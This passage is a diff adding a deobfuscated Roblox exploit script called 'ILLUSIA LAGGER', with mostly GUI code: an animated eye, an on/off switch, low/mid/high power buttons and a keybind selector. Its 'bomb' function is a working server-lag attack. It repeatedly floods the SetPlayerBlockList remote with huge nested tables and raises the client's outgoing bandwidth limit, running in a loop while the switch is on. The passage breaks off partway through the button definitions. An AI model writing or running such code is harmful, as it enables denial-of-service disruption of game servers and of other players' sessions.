@@ -1,0 +1,810 @@
+--[[
+========================================
+
+╔════════════════════════╗
+║          Cypher Spectre ║ EnvSight      ║
+╚════════════════════════╝
+Script Deobfuscated by Cypher Spectre
+Version: EnvSight
+Author on Discord / TikTok:
+@roman666cabj
+https://discord.gg/b8QsvrMCNq
+
+========================================
+]]
+
+--// KILL HUB - PANEL DE TERROR CON LLUVIA INTENSA (200x100)
+--// EFECTOS: Lluvia rápida, título animado desde el centro (tamaño y color)
+--// NUEVO: Selector de tecla/botón personalizable (haz clic en el cuadro y pulsa la tecla deseada)
+
+--// SERVICES
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local ConfigFile = "KillHubConfig.json"
+
+-- ⚙️ PODER EXACTO: 25 - 32 - 70
+local NIVELES = {
+    Low     = { poder = 20 },
+    Mid     = { poder = 28 },
+    High    = { poder = 60 }
+}
+
+local keybind = Enum.KeyCode.M
+local listeningForInput = false
+local laggerActive = false
+local lagThread = nil
+local nivelActual = "Low"
+local ventanaBloqueada = false
+
+-- 🎨 Стиль
+local UI_CONFIG = {
+    MainBg       = Color3.fromRGB(255, 255, 255),
+    TitleColor   = Color3.fromRGB(0, 0, 0),
+    TextColor    = Color3.fromRGB(0, 0, 0),
+    ButtonInact  = Color3.fromRGB(200, 180, 220),
+    ButtonAct    = Color3.fromRGB(120, 70, 180),
+    ToggleOff    = Color3.fromRGB(180, 180, 180),
+    ToggleOn     = Color3.fromRGB(120, 70, 180),
+    LockColor    = Color3.fromRGB(0, 0, 0),
+    UnlockColor  = Color3.fromRGB(150, 150, 150),
+    Font         = Enum.Font.GothamBold,
+    BorderColor  = Color3.fromRGB(200, 180, 220),
+    GlowColor    = Color3.fromRGB(160, 100, 200),
+    SelectorBg   = Color3.fromRGB(220, 210, 230),
+    SelectorAct  = Color3.fromRGB(120, 70, 180),
+}
+
+-- 💾 CONFIG
+local function SaveConfig()
+    local data = {
+        Keybind = keybind.Name,
+        Nivel = nivelActual,
+        Bloqueado = ventanaBloqueada
+    }
+    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
+end
+
+local function LoadConfig()
+    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
+        pcall(function()
+            local data = HttpService:JSONDecode(readfile(ConfigFile))
+            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
+            nivelActual = data.Nivel or "Low"
+            ventanaBloqueada = data.Bloqueado or false
+        end)
+    end
+end
+LoadConfig()
+
+-- ⚠️ LAG ENGINE
+local function bomb(poder)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
+    local max = math.min(12000, poder * 50)
+    for i = 1, max do table.insert(main, spam) end
+    pcall(function() 
+        local rs = game:GetService("RobloxReplicatedStorage")
+        if rs and rs:FindFirstChild("SetPlayerBlockList") then
+            rs.SetPlayerBlockList:FireServer(main)
+        end
+    end)
+end
+
+-- 🧩 ЭЛЕМЕНТЫ GUI
+local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, lockButton
+local titleLabel, textEnable, keybindButton, textLagger, toggleClick
+
+-- Функции обновления GUI
+local function actualizarBotonesNivel()
+    if not btnLow or not btnMid or not btnHigh then return end
+    if nivelActual == "Low" then
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnLow.TextColor3 = Color3.fromRGB(255,255,255)
+        btnLow.BorderSizePixel = 0
+    else
+        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnLow.TextColor3 = Color3.fromRGB(0,0,0)
+        btnLow.BorderSizePixel = 1
+        btnLow.BorderColor3 = UI_CONFIG.BorderColor
+    end
+    if nivelActual == "Mid" then
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnMid.TextColor3 = Color3.fromRGB(255,255,255)
+        btnMid.BorderSizePixel = 0
+    else
+        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnMid.TextColor3 = Color3.fromRGB(0,0,0)
+        btnMid.BorderSizePixel = 1
+        btnMid.BorderColor3 = UI_CONFIG.BorderColor
+    end
+    if nivelActual == "High" then
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonAct
+        btnHigh.TextColor3 = Color3.fromRGB(255,255,255)
+        btnHigh.BorderSizePixel = 0
+    else
+        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
+        btnHigh.TextColor3 = Color3.fromRGB(0,0,0)
+        btnHigh.BorderSizePixel = 1
+        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
+    end
+end
+
+local function actualizarSwitch()
+    if toggleContainer then
+        toggleContainer.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    end
+    if toggleBall then
+        toggleBall.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+        if laggerActive then
+            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
+        else
+            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
+        end
+    end
+    if toggleClick then
+        toggleClick.Text = laggerActive and "ON" or "OFF"
+        if laggerActive then
+            toggleClick.BackgroundColor3 = UI_CONFIG.ToggleOn
+            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+        else
+            toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        end
+    end
+end
+
+local function actualizarCandado()
+    if lockButton then
+        lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
+        lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor
+    end
+end
+
+local function actualizarKeybindButton()
+    if keybindButton then
+        local display = keybind.Name
+        if display:match("Button") then
+            display = display:gsub("Button", "")
+        end
+        keybindButton.Text = display
+    end
+end
+
+local function toggleLagger()
+    laggerActive = not laggerActive
+    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
+    local targetColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff
+    
+    if toggleBall and toggleContainer and toggleClick then
+        TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Position = targetPos,
+            BackgroundColor3 = targetColor
+        }):Play()
+        TweenService:Create(toggleContainer, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundColor3 = targetColor
+        }):Play()
+
+        toggleClick.Text = laggerActive and "ON" or "OFF"
+        if laggerActive then
+            toggleClick.BackgroundColor3 = UI_CONFIG.ToggleOn
+            toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255)
+        else
+            toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+        end
+    end
+
+    if laggerActive then
+        if lagThread then task.cancel(lagThread) end
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function() 
+                    local nc = game:GetService("NetworkClient")
+                    if nc then nc:SetOutgoingKBPSLimit(80000) end
+                end)
+                bomb(NIVELES[nivelActual].poder)
+                task.wait(0.18)
+            end
+        end)
+    else
+        if lagThread then task.cancel(lagThread); lagThread = nil end
+    end
+end
+
+-- 🖼️ ОСНОВНОЙ GUI
+function createMainUI()
+    if CoreGui:FindFirstChild("KillHub_UI") then CoreGui.KillHub_UI:Destroy() end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "KillHub_UI"
+    screenGui.Parent = CoreGui
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.ResetOnSpawn = false
+
+    -- Panel: 200 x 100
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.BackgroundColor3 = UI_CONFIG.MainBg
+    mainFrame.BorderSizePixel = 2
+    mainFrame.BorderColor3 = UI_CONFIG.GlowColor
+    mainFrame.Size = UDim2.new(0, 200, 0, 100)
+    mainFrame.Position = UDim2.new(0.15, 0, 0.5, -50)
+    mainFrame.Parent = screenGui
+    mainFrame.ClipsDescendants = true
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+
+    -- 👁️ РЕАЛИСТИЧНЫЙ АНИМЕ ГЛАЗ С ЛУЧИКАМИ
+    local eyeContainer = Instance.new("Frame")
+    eyeContainer.Name = "EyeContainer"
+    eyeContainer.BackgroundTransparency = 1
+    eyeContainer.Size = UDim2.new(1, 0, 1, 0)
+    eyeContainer.Parent = mainFrame
+    eyeContainer.ZIndex = 0
+
+    -- Тень под глазом
+    local eyeShadow = Instance.new("Frame")
+    eyeShadow.Name = "EyeShadow"
+    eyeShadow.BackgroundColor3 = Color3.fromRGB(200, 180, 210)
+    eyeShadow.BackgroundTransparency = 0.3
+    eyeShadow.Size = UDim2.new(0, 70, 0, 10)
+    eyeShadow.Position = UDim2.new(0.5, -35, 0.5, 20)
+    eyeShadow.BorderSizePixel = 0
+    eyeShadow.Parent = eyeContainer
+    eyeShadow.ZIndex = 0
+    Instance.new("UICorner", eyeShadow).CornerRadius = UDim.new(0.5, 0)
+
+    -- Белок глаза
+    local eyeWhite = Instance.new("Frame")
+    eyeWhite.Name = "EyeWhite"
+    eyeWhite.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    eyeWhite.Size = UDim2.new(0, 66, 0, 44)
+    eyeWhite.Position = UDim2.new(0.5, -33, 0.5, -22)
+    eyeWhite.BorderSizePixel = 2
+    eyeWhite.BorderColor3 = Color3.fromRGB(60, 40, 80)
+    eyeWhite.Parent = eyeContainer
+    eyeWhite.ZIndex = 0
+    Instance.new("UICorner", eyeWhite).CornerRadius = UDim.new(0.5, 0)
+
+    -- Контур глаза (внешний)
+    local eyeOutline = Instance.new("Frame")
+    eyeOutline.Name = "EyeOutline"
+    eyeOutline.BackgroundTransparency = 1
+    eyeOutline.Size = UDim2.new(0, 70, 0, 48)
+    eyeOutline.Position = UDim2.new(0.5, -35, 0.5, -24)
+    eyeOutline.BorderSizePixel = 3
+    eyeOutline.BorderColor3 = Color3.fromRGB(40, 25, 55)
+    eyeOutline.Parent = eyeContainer
+    eyeOutline.ZIndex = 5
+    Instance.new("UICorner", eyeOutline).CornerRadius = UDim.new(0.5, 0)
+
+    -- Внутренняя тень белка
+    local innerShadow = Instance.new("Frame")
+    innerShadow.Name = "InnerShadow"
+    innerShadow.BackgroundColor3 = Color3.fromRGB(200, 180, 210)
+    innerShadow.BackgroundTransparency = 0.4
+    innerShadow.Size = UDim2.new(0, 62, 0, 40)
+    innerShadow.Position = UDim2.new(0.5, -31, 0.5, -20)
+    innerShadow.BorderSizePixel = 0
+    innerShadow.Parent = eyeContainer
+    innerShadow.ZIndex = 0
+    Instance.new("UICorner", innerShadow).CornerRadius = UDim.new(0.5, 0)
+
+    -- Радужка
+    local iris = Instance.new("Frame")
+    iris.Name = "Iris"
+    iris.BackgroundColor3 = Color3.fromRGB(160, 80, 200)
+    iris.Size = UDim2.new(0, 32, 0, 32)
+    iris.Position = UDim2.new(0.5, -16, 0.5, -16)
+    iris.BorderSizePixel = 1
+    iris.BorderColor3 = Color3.fromRGB(80, 40, 120)
+    iris.Parent = eyeContainer
+    iris.ZIndex = 1
+    Instance.new("UICorner", iris).CornerRadius = UDim.new(1, 0)
+
+    -- 🌟 ЛУЧИКИ ВОКРУГ ЗРАЧКА
+    for i = 1, 12 do
+        local angle = (i / 12) * 360
+        local rad = math.rad(angle)
+        local length = 3 + math.random() * 4
+        local width = 1 + math.random() * 0.5
+        
+        local ray = Instance.new("Frame")
+        ray.Name = "Ray_" .. i
+        ray.BackgroundColor3 = Color3.fromRGB(140 + math.random() * 40, 60 + math.random() * 30, 180 + math.random() * 40)
+        ray.BackgroundTransparency = 0.2 + math.random() * 0.3
+        ray.Size = UDim2.new(0, length, 0, width)
+        ray.Position = UDim2.new(0.5 + math.sin(rad) * 10 / 100, 0, 0.5 + math.cos(rad) * 10 / 100, 0)
+        ray.Rotation = angle - 90 + math.random() * 3 - 1.5
+        ray.BorderSizePixel = 0
+        ray.Parent = iris
+        ray.ZIndex = 2
+        Instance.new("UICorner", ray).CornerRadius = UDim.new(1, 0)
+    end
+
+    -- Узор радужки (кольца)
+    for i = 1, 5 do
+        local ring = Instance.new("Frame")
+        ring.BackgroundColor3 = Color3.fromRGB(140 + i*6, 60 + i*5, 180 + i*6)
+        ring.BackgroundTransparency = 0.2 + i * 0.06
+        ring.Size = UDim2.new(0, 24 - i*2, 0, 24 - i*2)
+        ring.Position = UDim2.new(0.5, -(12 - i), 0.5, -(12 - i))
+        ring.BorderSizePixel = 0
+        ring.Parent = iris
+        ring.ZIndex = 1
+        Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
+    end
+
+    -- Зрачок
+    local pupil = Instance.new("Frame")
+    pupil.Name = "Pupil"
+    pupil.BackgroundColor3 = Color3.fromRGB(10, 3, 20)
+    pupil.Size = UDim2.new(0, 14, 0, 14)
+    pupil.Position = UDim2.new(0.5, -7, 0.5, -7)
+    pupil.BorderSizePixel = 1
+    pupil.BorderColor3 = Color3.fromRGB(40, 20, 60)
+    pupil.Parent = eyeContainer
+    pupil.ZIndex = 3
+    Instance.new("UICorner", pupil).CornerRadius = UDim.new(1, 0)
+
+    -- Ореол вокруг зрачка
+    local pupilGlow = Instance.new("Frame")
+    pupilGlow.Name = "PupilGlow"
+    pupilGlow.BackgroundColor3 = Color3.fromRGB(100, 50, 150)
+    pupilGlow.BackgroundTransparency = 0.5
+    pupilGlow.Size = UDim2.new(0, 20, 0, 20)
+    pupilGlow.Position = UDim2.new(0.5, -10, 0.5, -10)
+    pupilGlow.BorderSizePixel = 0
+    pupilGlow.Parent = eyeContainer
+    pupilGlow.ZIndex = 2
+    Instance.new("UICorner", pupilGlow).CornerRadius = UDim.new(1, 0)
+
+    -- Основной блик
+    local highlight1 = Instance.new("Frame")
+    highlight1.Name = "Highlight1"
+    highlight1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    highlight1.BackgroundTransparency = 0.1
+    highlight1.Size = UDim2.new(0, 12, 0, 12)
+    highlight1.Position = UDim2.new(0.5, -12, 0.5, -12)
+    highlight1.BorderSizePixel = 0
+    highlight1.Parent = eyeContainer
+    highlight1.ZIndex = 4
+    Instance.new("UICorner", highlight1).CornerRadius = UDim.new(1, 0)
+
+    -- Второй блик
+    local highlight2 = Instance.new("Frame")
+    highlight2.Name = "Highlight2"
+    highlight2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    highlight2.BackgroundTransparency = 0.2
+    highlight2.Size = UDim2.new(0, 7, 0, 7)
+    highlight2.Position = UDim2.new(0.5, -8, 0.5, -8)
+    highlight2.BorderSizePixel = 0
+    highlight2.Parent = eyeContainer
+    highlight2.ZIndex = 4
+    Instance.new("UICorner", highlight2).CornerRadius = UDim.new(1, 0)
+
+    -- Третий блик
+    local highlight3 = Instance.new("Frame")
+    highlight3.Name = "Highlight3"
+    highlight3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    highlight3.BackgroundTransparency = 0.35
+    highlight3.Size = UDim2.new(0, 4, 0, 4)
+    highlight3.Position = UDim2.new(0.5, 7, 0.5, 5)
+    highlight3.BorderSizePixel = 0
+    highlight3.Parent = eyeContainer
+    highlight3.ZIndex = 4
+    Instance.new("UICorner", highlight3).CornerRadius = UDim.new(1, 0)
+
+    -- Верхнее веко
+    local eyelidTop = Instance.new("Frame")
+    eyelidTop.Name = "EyelidTop"
+    eyelidTop.BackgroundColor3 = Color3.fromRGB(230, 220, 240)
+    eyelidTop.BackgroundTransparency = 0.35
+    eyelidTop.Size = UDim2.new(0, 72, 0, 16)
+    eyelidTop.Position = UDim2.new(0.5, -36, 0.5, -26)
+    eyelidTop.BorderSizePixel = 0
+    eyelidTop.Parent = eyeContainer
+    eyelidTop.ZIndex = 5
+    Instance.new("UICorner", eyelidTop).CornerRadius = UDim.new(0.5, 0)
+
+    -- Складка века
+    local eyelidFold = Instance.new("Frame")
+    eyelidFold.Name = "EyelidFold"
+    eyelidFold.BackgroundColor3 = Color3.fromRGB(200, 180, 215)
+    eyelidFold.BackgroundTransparency = 0.3
+    eyelidFold.Size = UDim2.new(0, 68, 0, 3)
+    eyelidFold.Position = UDim2.new(0.5, -34, 0.5, -17)
+    eyelidFold.BorderSizePixel = 0
+    eyelidFold.Parent = eyeContainer
+    eyelidFold.ZIndex = 5
+    Instance.new("UICorner", eyelidFold).CornerRadius = UDim.new(0.5, 0)
+
+    -- Нижнее веко
+    local eyelidBottom = Instance.new("Frame")
+    eyelidBottom.Name = "EyelidBottom"
+    eyelidBottom.BackgroundColor3 = Color3.fromRGB(230, 220, 240)
+    eyelidBottom.BackgroundTransparency = 0.25
+    eyelidBottom.Size = UDim2.new(0, 70, 0, 10)
+    eyelidBottom.Position = UDim2.new(0.5, -35, 0.5, 19)
+    eyelidBottom.BorderSizePixel = 0
+    eyelidBottom.Parent = eyeContainer
+    eyelidBottom.ZIndex = 5
+    Instance.new("UICorner", eyelidBottom).CornerRadius = UDim.new(0.5, 0)
+
+    -- Ресницы (верхние)
+    local lashAngles = {-50, -40, -28, -15, -5, 5, 15, 28, 40, 50}
+    for i, angle in ipairs(lashAngles) do
+        local lash = Instance.new("Frame")
+        lash.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
+        local length = 6 + math.random() * 5
+        if i == 4 or i == 5 or i == 6 or i == 7 then length = 9 end
+        lash.Size = UDim2.new(0, 2, 0, length)
+        local rad = math.rad(angle)
+        local dist = 34
+        lash.Position = UDim2.new(0.5 + math.sin(rad) * dist / 100, 0, 0.5 + math.cos(rad) * dist / 100 - 0.22, 0)
+        lash.Rotation = angle - 85 + math.random() * 3 - 1.5
+        lash.BorderSizePixel = 0
+        lash.Parent = eyeContainer
+        lash.ZIndex = 6
+        Instance.new("UICorner", lash).CornerRadius = UDim.new(0.5, 0)
+    end
+
+    -- Ресницы (нижние)
+    local bottomLashAngles = {-35, -20, -8, 8, 20, 35}
+    for i, angle in ipairs(bottomLashAngles) do
+        local lash = Instance.new("Frame")
+        lash.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
+        local length = 4 + math.random() * 3
+        lash.Size = UDim2.new(0, 1.5, 0, length)
+        local rad = math.rad(angle + 180)
+        local dist = 34
+        lash.Position = UDim2.new(0.5 + math.sin(rad) * dist / 100, 0, 0.5 + math.cos(rad) * dist / 100 + 0.22, 0)
+        lash.Rotation = angle + 85 + math.random() * 3 - 1.5
+        lash.BorderSizePixel = 0
+        lash.Parent = eyeContainer
+        lash.ZIndex = 6
+        Instance.new("UICorner", lash).CornerRadius = UDim.new(0.5, 0)
+    end
+
+    -- Подводка (верхняя)
+    local eyeliner = Instance.new("Frame")
+    eyeliner.Name = "Eyeliner"
+    eyeliner.BackgroundColor3 = Color3.fromRGB(25, 15, 40)
+    eyeliner.Size = UDim2.new(0, 72, 0, 2)
+    eyeliner.Position = UDim2.new(0.5, -36, 0.5, -19)
+    eyeliner.BorderSizePixel = 0
+    eyeliner.Parent = eyeContainer
+    eyeliner.ZIndex = 5
+
+    -- Подводка (нижняя)
+    local eyelinerBottom = Instance.new("Frame")
+    eyelinerBottom.Name = "EyelinerBottom"
+    eyelinerBottom.BackgroundColor3 = Color3.fromRGB(25, 15, 40)
+    eyelinerBottom.BackgroundTransparency = 0.5
+    eyelinerBottom.Size = UDim2.new(0, 60, 0, 1.5)
+    eyelinerBottom.Position = UDim2.new(0.5, -30, 0.5, 21)
+    eyelinerBottom.BorderSizePixel = 0
+    eyelinerBottom.Parent = eyeContainer
+    eyelinerBottom.ZIndex = 5
+
+    -- Анимация глаза
+    task.spawn(function()
+        local phase = 0
+        while true do
+            phase = phase + 0.008
+            local moveX = math.sin(phase) * 4
+            local moveY = math.cos(phase * 0.7) * 3
+            
+            if pupil and iris and pupilGlow and highlight1 and highlight2 and highlight3 then
+                pupil.Position = UDim2.new(0.5, -7 + moveX, 0.5, -7 + moveY)
+                iris.Position = UDim2.new(0.5, -16 + moveX * 0.6, 0.5, -16 + moveY * 0.6)
+                pupilGlow.Position = UDim2.new(0.5, -10 + moveX * 0.5, 0.5, -10 + moveY * 0.5)
+                highlight1.Position = UDim2.new(0.5, -12 + moveX * 0.4, 0.5, -12 + moveY * 0.4)
+                highlight2.Position = UDim2.new(0.5, -8 + moveX * 0.3, 0.5, -8 + moveY * 0.3)
+                highlight3.Position = UDim2.new(0.5, 7 + moveX * 0.2, 0.5, 5 + moveY * 0.2)
+            end
+            
+            -- Моргание
+            if math.random() < 0.001 and eyelidTop and eyelidBottom then
+                TweenService:Create(eyelidTop, TweenInfo.new(0.08), {
+                    Size = UDim2.new(0, 72, 0, 28),
+                    BackgroundTransparency = 0.1
+                }):Play()
+                TweenService:Create(eyelidBottom, TweenInfo.new(0.08), {
+                    Size = UDim2.new(0, 70, 0, 22),
+                    BackgroundTransparency = 0.1
+                }):Play()
+                task.wait(0.12)
+                TweenService:Create(eyelidTop, TweenInfo.new(0.08), {
+                    Size = UDim2.new(0, 72, 0, 16),
+                    BackgroundTransparency = 0.35
+                }):Play()
+                TweenService:Create(eyelidBottom, TweenInfo.new(0.08), {
+                    Size = UDim2.new(0, 70, 0, 10),
+                    BackgroundTransparency = 0.25
+                }):Play()
+            end
+            
+            task.wait(0.05)
+        end
+    end)
+
+    -- ═══════════════════════════════════════════
+    -- TÍTULO "ILLUSIA LAGGER"
+    -- ═══════════════════════════════════════════
+    titleLabel = Instance.new("TextLabel", mainFrame)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Position = UDim2.new(0, 10, 0, -30)
+    titleLabel.Size = UDim2.new(1, -45, 0, 28)
+    titleLabel.Font = Enum.Font.GothamBlack
+    titleLabel.Text = "ILLUSIA LAGGER"
+    titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+    titleLabel.TextSize = 14
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+    titleLabel.ZIndex = 7
+    titleLabel.ClipsDescendants = false
+
+    -- Анимация заголовка
+    task.spawn(function()
+        local times = 0
+        while times < 3 do
+            titleLabel.Position = UDim2.new(0, 10, 0, 32)
+            TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Position = UDim2.new(0, 10, 0, 0)
+            }):Play()
+            task.wait(0.8)
+            TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                Position = UDim2.new(0, 10, 0, 32)
+            }):Play()
+            task.wait(0.6)
+            times = times + 1
+        end
+        TweenService:Create(titleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0, 10, 0, 0)
+        }):Play()
+    end)
+
+    -- Candado
+    lockButton = Instance.new("TextButton", mainFrame)
+    lockButton.BackgroundTransparency = 1
+    lockButton.Position = UDim2.new(1, -50, 0, 3)
+    lockButton.Size = UDim2.new(0, 45, 0, 18)
+    lockButton.Font = UI_CONFIG.Font
+    lockButton.TextSize = 10
+    lockButton.TextColor3 = UI_CONFIG.TextColor
+    lockButton.AutoButtonColor = false
+    lockButton.ZIndex = 7
+    lockButton.MouseButton1Click:Connect(function()
+        ventanaBloqueada = not ventanaBloqueada
+        actualizarCandado()
+        SaveConfig()
+    end)
+    actualizarCandado()
+
+    -- ENABLE LAGGER
+    textEnable = Instance.new("TextLabel", mainFrame)
+    textEnable.BackgroundTransparency = 1
+    textEnable.Position = UDim2.new(0, 10, 0, 30)
+    textEnable.Size = UDim2.new(0, 40, 0, 16)
+    textEnable.Font = UI_CONFIG.Font
+    textEnable.Text = "ENABLE"
+    textEnable.TextColor3 = UI_CONFIG.TextColor
+    textEnable.TextSize = 10
+    textEnable.TextXAlignment = Enum.TextXAlignment.Left
+    textEnable.ZIndex = 7
+
+    textLagger = Instance.new("TextLabel", mainFrame)
+    textLagger.BackgroundTransparency = 1
+    textLagger.Position = UDim2.new(0, 52, 0, 30)
+    textLagger.Size = UDim2.new(0, 45, 0, 16)
+    textLagger.Font = UI_CONFIG.Font
+    textLagger.Text = "LAGGER"
+    textLagger.TextColor3 = UI_CONFIG.TextColor
+    textLagger.TextSize = 10
+    textLagger.TextXAlignment = Enum.TextXAlignment.Left
+    textLagger.ZIndex = 7
+
+    -- Keybind Button
+    keybindButton = Instance.new("TextButton", mainFrame)
+    keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
+    keybindButton.Position = UDim2.new(0, 100, 0, 30)
+    keybindButton.Size = UDim2.new(0, 24, 0, 16)
+    keybindButton.Font = UI_CONFIG.Font
+    keybindButton.Text = "M"
+    keybindButton.TextColor3 = Color3.fromRGB(0,0,0)
+    keybindButton.TextSize = 9
+    keybindButton.AutoButtonColor = false
+    keybindButton.ZIndex = 7
+    Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 3)
+    actualizarKeybindButton()
+
+    -- SWITCH
+    toggleContainer = Instance.new("Frame", mainFrame)
+    toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
+    toggleContainer.Position = UDim2.new(1, -50, 0, 30)
+    toggleContainer.Size = UDim2.new(0, 42, 0, 20)
+    toggleContainer.ZIndex = 7
+    Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)
+
+    toggleBall = Instance.new("Frame", toggleContainer)
+    toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
+    toggleBall.Size = UDim2.new(0, 18, 0, 18)
+    toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
+    toggleBall.ZIndex = 7
+    Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)
+
+    toggleClick = Instance.new("TextButton", toggleContainer)
+    toggleClick.BackgroundTransparency = 0
+    toggleClick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    toggleClick.Size = UDim2.new(1,0,1,0)
+    toggleClick.ZIndex = 8
+    toggleClick.Font = UI_CONFIG.Font
+    toggleClick.Text = "OFF"
+    toggleClick.TextSize = 9
+    toggleClick.TextColor3 = Color3.fromRGB(0, 0, 0)
+    toggleClick.TextXAlignment = Enum.TextXAlignment.Center
+    toggleClick.TextYAlignment = Enum.TextYAlignment.Center
+    toggleClick.MouseButton1Click:Connect(toggleLagger)
+    toggleClick.AutoButtonColor = false
+    local corner = Instance.new("UICorner", toggleClick)
+    corner.CornerRadius = UDim.new(1,0)
+
+    -- SELECTOR DE TECLA
+    keybindButton.MouseButton1Click:Connect(function()
+        if listeningForInput then return end
+        listeningForInput = true
+        keybindButton.Text = "..."
+        keybindButton.BackgroundColor3 = UI_CONFIG.GlowColor
+        keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
+    end)
+
+    local inputConnection
+    inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
+        if not listeningForInput then return end
+        if gp then return end
+
+        local newKey = nil
+        if input.KeyCode ~= Enum.KeyCode.Unknown then
+            newKey = input.KeyCode
+        elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
+            newKey = input.KeyCode
+        end
+
+        if newKey then
+            keybind = newKey
+            actualizarKeybindButton()
+            SaveConfig()
+            listeningForInput = false
+            keybindButton.BackgroundColor3 = UI_CONFIG.SelectorBg
+            keybindButton.TextColor3 = Color3.fromRGB(0,0,0)
+        end
+    end)
+
+    -- Botones LOW/MID/HIGH
+    local btnY = 62
+    local btnW = 60
+    local btnH = 24
+    local espaciado = 5
+    local margenIzq = 5
+
+    local function aplicarEfectoHover(btn)
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = UI_CONFIG.GlowColor,
+                TextColor3 = Color3.fromRGB(255,255,255)
+            }):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {
+                BackgroundColor3 = btn.BackgroundColor3,
+                TextColor3 = btn.TextColor3
+            }):Play()
+        end)
+    end
+
+    btnLow = Instance.new("TextButton", mainFrame)
+    btnLow.Size = UDim2.new(0, btnW, 0, btnH)
+    btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
+    btnLow.Font = UI_CONFIG.Font
+    btnLow.Text = "LOW"
+    btnLow.TextColor3 = Color3.fromRGB(0,0,0)
+    btnLow.TextSize = 10
+    btnLow.AutoButtonColor = false
+    btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
+    btnLow.BorderSizePixel = 1
+    btnLow.BorderColor3 = UI_CONFIG.BorderColor
+    btnLow.ZIndex = 7
+    Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 5)
+    btnLow.MouseButton1Click:Connect(function()
+        nivelActual = "Low"
+        actualizarBotonesNivel()
+        SaveConfig()
+    end)
+    aplicarEfectoHover(btnLow)
+
+    btnMid = Instance.new("TextButton", mainFrame)
+    btnMid.Size = UDim2.new(0, btnW, 0, btnH)
+    btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
+    btnMid.Font = UI_CONFIG.Font
+    btnMid.Text = "MID"
+    btnMid.TextColor3 = Color3.fromRGB(0,0,0)
+    btnMid.TextSize = 10
+    btnMid.AutoButtonColor = false
+    btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
+    btnMid.BorderSizePixel = 1
+    btnMid.BorderColor3 = UI_CONFIG.BorderColor
+    btnMid.ZIndex = 7
